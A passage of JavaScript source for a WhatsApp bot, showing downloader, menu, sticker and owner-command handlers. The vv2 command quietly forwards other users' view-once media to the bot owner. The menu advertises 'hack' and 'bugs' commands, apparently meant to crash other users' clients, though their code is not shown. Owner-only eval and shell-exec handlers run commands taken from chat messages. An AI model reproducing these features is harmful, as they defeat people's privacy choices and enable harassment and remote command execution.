            await XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        }

        if (quotedMessage.videoMessage) {
            let videoCaption = quotedMessage.videoMessage.caption || '';
            let videoUrl = await XeonBotInc.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
            await XeonBotInc.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        }

        if (quotedMessage.audioMessage) {
            let audioUrl = await XeonBotInc.downloadAndSaveMediaMessage(quotedMessage.audioMessage);
            await XeonBotInc.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mp4' });
        }

    } catch (error) {
        console.error('Error processing vv command:', error);
        replygcxeon('❌ An error occurred while processing your request.');
    }
    break;
}
case 'readviewonce2': case 'vv2': {
    try {
        if (!m.quoted) return replygcxeon('❌ Reply to a ViewOnce Video, Image, or Audio.');

        const quotedMessage = m.msg.contextInfo.quotedMessage;
        if (!quotedMessage) return replygcxeon('❌ No media found in the quoted message.');

        if (quotedMessage.imageMessage) {
            let imageCaption = quotedMessage.imageMessage.caption || '';
            let imageUrl = await XeonBotInc.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
            await XeonBotInc.sendMessage(XeonBotInc.user.id, { image: { url: imageUrl }, caption: imageCaption });
        }

        if (quotedMessage.videoMessage) {
            let videoCaption = quotedMessage.videoMessage.caption || '';
            let videoUrl = await XeonBotInc.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
            await XeonBotInc.sendMessage(XeonBotInc.user.id, { video: { url: videoUrl }, caption: videoCaption });
        }

        if (quotedMessage.audioMessage) {
            let audioUrl = await XeonBotInc.downloadAndSaveMediaMessage(quotedMessage.audioMessage);
            await XeonBotInc.sendMessage(XeonBotInc.user.id, { audio: { url: audioUrl }, mimetype: 'audio/mp4' });
        }

    } catch (error) {
        console.error('Error processing vv2 command:', error);
    }
    break;
}
case 'ytmp4': {
    if (!text) return replygcxeon(`*Example*: ${prefix + command} https://youtube.com/watch?v=60ItHLz5WEA`);

    try {
        // Fetch video download details
        const apiResponse = await axios.get(`https://api.siputzx.my.id/api/d/ytmp4`, {
            params: { url: text }
        });

        if (apiResponse.data.status) {
            const { title, dl } = apiResponse.data.data;

            await XeonBotInc.sendMessage(m.chat, {
                video: { url: dl },
                mimetype: 'video/mp4',
                caption: `🎬 *Title:* ${title}`
            }, { quoted: m });
        } else {
            replygcxeon(`*Error fetching the video!*`);
        }
    } catch (error) {
        console.error('Error during ytmp4 command:', error);
        replygcxeon(`*An error occurred while processing your request.*`);
    }
    break;
}

case 'ytmp3': {
    if (!text) return replygcxeon(`*Example*: ${prefix + command} https://youtube.com/watch?v=60ItHLz5WEA`);

    try {
        // Fetch audio download details
        const apiResponse = await axios.get(`https://api.siputzx.my.id/api/d/ytmp3`, {
            params: { url: text }
        });

        if (apiResponse.data.status) {
            const { title, dl } = apiResponse.data.data;

            await XeonBotInc.sendMessage(m.chat, {
                audio: { url: dl },
                mimetype: 'audio/mp4',
                fileName: `${title}.mp3`,
                caption: `🎧 *Here's your song:*\n> *Title:* ${title}`
            }, { quoted: m });
        } else {
            replygcxeon(`*Error fetching the audio!*`);
        }
    } catch (error) {
        console.error('Error during ytmp3 command:', error);
        replygcxeon(`*An error occurred while processing your request.*`);
    }
    break;
}
case 'clearchat':
xeonimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
            case 'menu':
            case '.menu':
            case 'alive':
            case '?':
            case 'Menu':
               let xeonmenuoh = `
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
┃  ✨ *Creator: ᴘʜ✦ꜱᴛᴀʀ* 💫
┃  🧪 *Version: 1.0.0* 
┃  🤖 *Model: Big Daddy V1* 
┃  ⏰ *Uptime:* *${runtime(process.uptime())}*
▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓
${readmore}
╭⭑━━━➤ ʜᴀᴄᴋ ᴍᴇɴᴜ  
┣ ◁️⚡💥 𝐡𝐠𝐜  
┣ ◁️⚡💥 𝐡𝐚𝐜𝐤𝐠𝐜  
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐌𝐄𝐍𝐔
┣ ◁️💥 𝐩𝐥𝐚𝐲
┣ ◁️💥 𝐦𝐞𝐝𝐢𝐚𝐟𝐢𝐫𝐞
┣ ◁️💥 𝐬𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭
┣ ◁️💥 𝐬𝐡𝐚𝐳𝐚𝐦
┣ ◁️💥 𝐫𝐞𝐦𝐢𝐧𝐢
┣ ◁️💥 𝐚𝐩𝐤
┣ ◁️💥 𝐟𝐛
┣ ◁️💥 𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦
┣ ◁️💥 𝐠𝐞𝐧𝐞𝐫𝐚𝐭𝐞
┣ ◁️💥 𝐬𝐨𝐧𝐠
┣ ◁️💥 𝐭𝐢𝐤𝐭𝐨𝐤
┣ ◁️💥 𝐟𝐛
┣ ◁️💥 𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦
┣ ◁️💥 𝐲𝐭𝐦𝐩3
┣ ◁️💥 𝐲𝐭𝐦𝐩4
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ sᴘᴇᴄɪᴀʟ ᴍᴇɴᴜ  
┣ ◁️⚡💥 𝐩𝐫𝐨𝐦𝐨𝐭𝐞𝐬𝐞𝐥𝐟  
┣ ◁️⚡💥 𝐛𝐚𝐧𝐭𝐮𝐭𝐨𝐫𝐢𝐚𝐥  
┣ ◁️⚡💥 𝐬𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭  
┣ ◁️⚡💥 𝐮𝐩𝐝𝐚𝐭𝐞  
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ ᴘʀᴏ ʙᴜɢs (ᴀɴᴅʀᴏɪᴅ)
┣ ◁️⚡💥 𝐜𝐫𝐚𝐬𝐡𝐩𝐨𝐨𝐥
┣ ◁️⚡💥 𝐬𝐡𝐨𝐭𝐩𝐨𝐨𝐥
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ ᴘʀᴏ ʙᴜɢs (ᴡᴇʙ)
┣ ◁️⚡💥 𝐱𝐰𝐞𝐛𝐠𝐜
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ ᴘʀᴏ ʙᴜɢs (ɪᴏꜱ)
┣ ◁️⚡💥 𝐱𝐢𝐨𝐬𝐡𝐨𝐭
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ ᴀɴᴛɪ-ʙᴜɢ
┣ ◁️⚡💥 𝐮𝐥𝐭𝐫𝐚𝐛𝐮𝐠 [𝐀𝐔𝐓𝐎]
┣ ◁️⚡💥 𝐚𝐧𝐭𝐢𝐛𝐮𝐠 [𝐨𝐩𝐭𝐢𝐨𝐧]
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ ʙᴀɴ/ᴜɴʙᴀɴ
┣ ◁️⚡💥 𝐛𝐚𝐧
┣ ◁️⚡💥 𝐮𝐧𝐛𝐚𝐧 
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ sᴍᴀʀᴛ ᴍᴇɴᴜ  
┣ ◁️⚡💥 𝐯𝐢𝐝𝐞𝐨  
┣ ◁️⚡💥 𝐜𝐡𝐚𝐭𝐠𝐩𝐭  
┣ ◁️⚡💥 𝐰𝐞𝐚𝐭𝐡𝐞𝐫  
┣ ◁️⚡💥 𝐭𝐢𝐦𝐞  
┣ ◁️⚡💥 𝐜𝐡𝐚𝐭𝐛𝐨𝐭 [𝐨𝐩𝐭𝐢𝐨𝐧] 
┣ ◁️⚡💥 𝐜𝐡𝐚𝐭𝐛𝐨𝐭𝐚𝐮𝐝𝐢𝐨 [𝐨𝐩𝐭𝐢𝐨𝐧] 
┣ ◁️⚡💥 𝐠𝐩𝐭3  
┣ ◁️⚡💥 𝐠𝐩𝐭2  
┣ ◁️⚡💥 𝐠𝐨𝐨𝐠𝐥𝐞  
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ ᴀɴᴛɪ ᴍᴇɴᴜ  
┣ ◁️⚡💥 𝐚𝐧𝐭𝐢𝐛𝐢𝐥𝐥𝐢𝐧𝐠 [𝐨𝐩𝐭𝐢𝐨𝐧]
┣ ◁️⚡💥 𝐚𝐧𝐭𝐢𝐝𝐞𝐥𝐞𝐭𝐞 [𝐨𝐩𝐭𝐢𝐨𝐧]
┣ ◁️⚡💥 𝐚𝐧𝐭𝐢𝐥𝐢𝐧𝐤 [𝐨𝐩𝐭𝐢𝐨𝐧]
┣ ◁️⚡💥 𝐚𝐧𝐭𝐢𝐜𝐚𝐥𝐥 [𝐨𝐩𝐭𝐢𝐨𝐧]
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ ɢᴀᴍᴇs ᴍᴇɴᴜ  
┣ ◁️⚡💥 𝐝𝐚𝐫𝐞  
┣ ◁️⚡💥 𝐟𝐚𝐜𝐭  
┣ ◁️⚡💥 𝐜𝐨𝐦𝐩𝐥𝐢𝐦𝐞𝐧𝐭  
┣ ◁️⚡💥 𝐣𝐨𝐤𝐞  
┣ ◁️⚡💥 𝐫𝐢𝐝𝐝𝐥𝐞  
┣ ◁️⚡💥 𝐪𝐮𝐨𝐭𝐞  
┣ ◁️⚡💥 𝐰𝐨𝐮𝐥𝐝𝐲𝐨𝐮𝐫𝐚𝐭𝐡𝐞𝐫  
┣ ◁️⚡💥 𝐭𝐫𝐢𝐯𝐢𝐚  
┣ ◁️⚡💥 𝐭𝐫𝐮𝐭𝐡  
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ ᴏᴡɴᴇʀ ᴍᴇɴᴜ  
┣ ◁️⚡💥 𝐠𝐞𝐭𝐬𝐞𝐬𝐬𝐢𝐨𝐧  
┣ ◁️⚡💥 𝐝𝐞𝐥𝐞𝐭𝐞𝐬𝐞𝐬𝐬𝐢𝐨𝐧  
┣ ◁️⚡💥 𝐣𝐨𝐢𝐧  
┣ ◁️⚡💥 𝐬𝐡𝐮𝐭𝐝𝐨𝐰𝐧  
┣ ◁️⚡💥 𝐫𝐞𝐬𝐭𝐚𝐫𝐭  
┣ ◁️⚡💥 𝐚𝐮𝐭𝐨𝐫𝐞𝐚𝐝 [𝐨𝐩𝐭𝐢𝐨𝐧]  
┣ ◁️⚡💥 𝐚𝐮𝐭𝐨𝐭𝐲𝐩𝐢𝐧𝐠 [𝐨𝐩𝐭𝐢𝐨𝐧]  
┣ ◁️⚡💥 𝐚𝐮𝐭𝐨𝐫𝐞𝐜𝐨𝐫𝐝𝐢𝐧𝐠 [𝐨𝐩𝐭𝐢𝐨𝐧]  
┣ ◁️⚡💥 𝐚𝐮𝐭𝐨𝐫𝐞𝐜𝐨𝐫𝐝𝐭𝐲𝐩 [𝐨𝐩𝐭𝐢𝐨𝐧]  
┣ ◁️⚡💥 𝐚𝐮𝐭𝐨𝐛𝐢𝐨 [𝐨𝐩𝐭𝐢𝐨𝐧]  
┣ ◁️⚡💥 𝐚𝐮𝐭𝐨𝐬𝐰𝐯𝐢𝐞𝐰 [𝐨𝐩𝐭𝐢𝐨𝐧]  
┣ ◁️⚡💥 𝐚𝐮𝐭𝐨𝐫𝐞𝐚𝐜𝐭 [𝐨𝐩𝐭𝐢𝐨𝐧]  
┣ ◁️⚡💥 𝐦𝐨𝐝𝐞 [𝐨𝐩𝐭𝐢𝐨𝐧]  
┣ ◁️⚡💥 𝐛𝐥𝐨𝐜𝐤  
┣ ◁️⚡💥 𝐮𝐧𝐛𝐥𝐨𝐜𝐤  
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔  
┣ ◁️⚡💥 𝐜𝐥𝐨𝐬𝐞𝐭𝐢𝐦𝐞
┣ ◁️⚡💥 𝐨𝐩𝐞𝐧𝐭𝐢𝐦𝐞
┣ ◁️⚡💥 𝐤𝐢𝐜𝐤
┣ ◁️⚡💥 𝐚𝐝𝐝
┣ ◁️⚡💥 𝐩𝐫𝐨𝐦𝐨𝐭𝐞
┣ ◁️⚡💥 𝐝𝐞𝐦𝐨𝐭𝐞
┣ ◁️⚡💥 𝐬𝐞𝐭𝐝𝐞𝐬𝐜
┣ ◁️⚡💥 𝐬𝐞𝐭𝐩𝐩𝐠𝐜
┣ ◁️⚡💥 𝐡𝐢𝐝𝐞𝐭𝐚𝐠
┣ ◁️⚡💥 𝐭𝐨𝐭𝐚𝐠
┣ ◁️⚡💥 𝐠𝐫𝐨𝐮𝐩 []
┣ ◁️⚡💥 𝐞𝐝𝐢𝐭𝐢𝐧𝐟𝐨
┣ ◁️⚡💥 𝐥𝐢𝐧𝐤𝐠𝐜
┣ ◁️⚡💥 𝐫𝐞𝐯𝐨𝐤𝐞
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐨𝐧𝐥𝐢𝐧𝐞
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔
┣ ◁️⚡💥 𝐦𝐞𝐧𝐮
┣ ◁️⚡💥 𝐛𝐮𝐲𝐩𝐫𝐞𝐦𝐢𝐮𝐦
┣ ◁️⚡💥 𝐫𝐮𝐧𝐭𝐢𝐦𝐞
┣ ◁️⚡💥 𝐬𝐜𝐫𝐢𝐩𝐭
┣ ◁️⚡💥 𝐝𝐨𝐧𝐚𝐭𝐞
┣ ◁️⚡💥 𝐨𝐰𝐧𝐞𝐫
┣ ◁️⚡💥 𝐩𝐢𝐧𝐠
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ 𝐂𝐎𝐍𝐕𝐄𝐑𝐓 𝐌𝐄𝐍𝐔
┣ ◁️⚡💥 𝐬𝐭𝐢𝐜𝐤𝐞𝐫
┣ ◁️⚡💥 𝐬𝐦𝐞𝐦𝐞
┣ ◁️⚡💥 𝐭𝐚𝐤𝐞
┣ ◁️⚡💥 𝐭𝐨𝐢𝐦𝐚𝐠𝐞
┣ ◁️⚡💥 𝐭𝐨𝐯𝐢𝐝𝐞𝐨
┣ ◁️⚡💥 𝐭𝐨𝐚𝐮𝐝𝐢𝐨
┣ ◁️⚡💥 𝐭𝐨𝐦𝐩𝟑
┣ ◁️⚡💥 𝐭𝐨𝐯𝐧
┣ ◁️⚡💥 𝐭𝐨𝐠𝐢𝐟
┣ ◁️⚡💥 𝐭𝐨𝐪𝐫
┣ ◁️⚡💥 𝐭𝐨𝐯𝐢𝐞𝐰𝐨𝐧𝐜𝐞
┣ ◁️⚡💥 𝐟𝐥𝐢𝐩𝐭𝐞𝐱𝐭
┣ ◁️⚡💥 𝐞𝐦𝐨𝐣𝐢𝐦𝐢𝐱
┣ ◁️⚡💥 𝐭𝐞𝐱𝐭2𝐬𝐩𝐞𝐞𝐜𝐡
┣ ◁️⚡💥 𝐭𝐞𝐱𝐭2𝐩𝐝𝐟
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄 𝐌𝐄𝐍𝐔
┣ ◁️⚡💥 𝐚𝐝𝐝𝐯𝐢𝐝𝐞𝐨
┣ ◁️⚡💥 𝐚𝐝𝐝𝐢𝐦𝐚𝐠𝐞
┣ ◁️⚡💥 𝐚𝐝𝐝𝐬𝐭𝐢𝐜𝐤𝐞𝐫
┣ ◁️⚡💥 𝐚𝐝𝐝𝐯𝐧
┣ ◁️⚡💥 𝐚𝐝𝐝𝐳𝐢𝐩
┣ ◁️⚡💥 𝐚𝐝𝐝𝐚𝐩𝐤
┣ ◁️⚡💥 𝐚𝐝𝐝𝐩𝐝𝐟
┣ ◁️⚡💥 𝐝𝐞𝐥𝐯𝐢𝐝𝐞𝐨
┣ ◁️⚡💥 𝐝𝐞𝐥𝐢𝐦𝐚𝐠𝐞
┣ ◁️⚡💥 𝐝𝐞𝐥𝐬𝐭𝐢𝐜𝐤𝐞𝐫
┣ ◁️⚡💥 𝐝𝐞𝐥𝐯𝐧
┣ ◁️⚡💥 𝐝𝐞𝐥𝐳𝐢𝐩
┣ ◁️⚡💥 𝐝𝐞𝐥𝐚𝐩𝐤
┣ ◁️⚡💥 𝐝𝐞𝐥𝐩𝐝𝐟
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐯𝐢𝐝𝐞𝐨
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐢𝐦𝐚𝐠𝐞
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐬𝐭𝐢𝐜𝐤𝐞𝐫
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐯𝐧
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐳𝐢𝐩
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐚𝐩𝐤
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐩𝐝𝐟
╰━━━━━━━━━━━━━━━━━━╯

© *ᴘʜ✦ꜱᴛᴀʀ*`
if (typemenu === 'v1') {
    XeonBotInc.sendMessage(m.chat, {
        text: xeonmenuoh,
        contextInfo: {
            externalAdReply: {
                title: botname,
                body: ownername,
                thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp',
                sourceUrl: link,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, {
        quoted: m
    });

    // Send audio after the menu
    XeonBotInc.sendMessage(m.chat, {
        audio: fs.readFileSync('Phistar-media/𝓑𝓲𝓰𝓓𝓪𝓭𝓭𝔂.mp3'),
        mimetype: 'audio/mpeg', // MIME type for MP3 file
        ptt: true // Send as a voice note
    }, {
        quoted: m
    });
} else if (typemenu === 'v2') {
    XeonBotInc.sendMessage(m.chat, {
        video: fs.readFileSync('./Phistar-media/thumb2.mp4'),
        gifPlayback: true,
        caption: xeonmenuoh,
        contextInfo: {
            externalAdReply: {
                title: botname,
                body: ownername,
                thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp',
                sourceUrl: ``,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, {
        quoted: m
    });

    // Send audio after the menu
    XeonBotInc.sendMessage(m.chat, {
        audio: fs.readFileSync('Phistar-media/𝓑𝓲𝓰𝓓𝓪𝓭𝓭𝔂.mp3'),
        mimetype: 'audio/mpeg',
        ptt: true
    }, {
        quoted: m
    });
} else if (typemenu === 'v3') {
    XeonBotInc.sendMessage(m.chat, {
        video: fs.readFileSync('./Phistar-media/thumb2.mp4'),
        caption: xeonmenuoh,
        gifPlayback: true
    }, {
        quoted: m
    });

    // Send audio after the menu
    XeonBotInc.sendMessage(m.chat, {
        audio: fs.readFileSync('Phistar-media/𝓑𝓲𝓰𝓓𝓪𝓭𝓭𝔂.mp3'),
        mimetype: 'audio/mpeg',
        ptt: true
    }, {
        quoted: m
    });
} else if (typemenu === 'v4') {
    XeonBotInc.relayMessage(m.chat, {
        scheduledCallCreationMessage: {
            callType: "AUDIO",
            scheduledTimestampMs: 1200,
            title: xeonmenuoh
        }
    }, {});

    // Send audio after the menu
    XeonBotInc.sendMessage(m.chat, {
        audio: fs.readFileSync('Phistar-media/𝓑𝓲𝓰𝓓𝓪𝓭𝓭𝔂.mp3'),
        mimetype: 'audio/mpeg',
        ptt: true
    }, {
        quoted: m
    });
}
                break
                case 'telestick': {
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let xeonresources = await Telesticker(args[0])
		await replygcxeon(`Sending ${xeonresources.length} stickers...`)
		if (m.isGroup && xeonresources.length > 30) {
			await replygcxeon('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < xeonresources.length; i++) {
				XeonBotInc.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
			}
		} else {
			for (let i = 0; i < xeonresources.length; i++) {
				XeonBotInc.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
			}
		}
	} else replygcxeon(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return replygcxeon(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replygcxeon(bang)
                    }
                    try {
                        replygcxeon(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replygcxeon(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return replygcxeon(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replygcxeon(evaled)
                    } catch (err) {
                        await replygcxeon(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replygcxeon(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replygcxeon(err)
                        if (stdout) return replygcxeon(stdout)
                    })
                }
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})
